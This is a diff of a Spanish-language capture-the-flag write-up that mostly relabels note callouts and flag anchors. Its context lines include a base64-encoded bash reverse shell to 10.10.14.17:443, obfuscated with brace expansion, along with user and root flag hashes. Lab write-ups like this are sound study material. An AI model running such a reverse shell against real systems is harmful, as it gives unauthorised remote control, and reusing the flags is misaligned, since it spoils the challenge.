@@ -140,7 +140,7 @@ Ejecuto la reverse shell en base64, la decodifico y ejecuta una bash
 {echo,-n,YmFzaCAtYyAiYmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTcvNDQzICAwPiYxICAi}|{base64,-d}|bash
 ```
 
->[!NOTE]
+>[!note]
 >En bash si se ponen `{}` y dentro `,` las comillas hacen de separadores.
 
 >[!ATTENTION] Salto de linea
@@ -223,10 +223,10 @@ ___
 
 ## Bandera(s)
 
-> [!FLAG] `flag{user}`
+> [!flag] `flag{user}`
 > bdd425b4bc47a934c43906523b613df2
-^bandera
+^bandera-user
 
-> [!FLAG] `flag{root}`
+> [!flag] `flag{root}`
 > 84a46e4c85adb27743b6f3cc385eae89
-^bandera
+^bandera-root
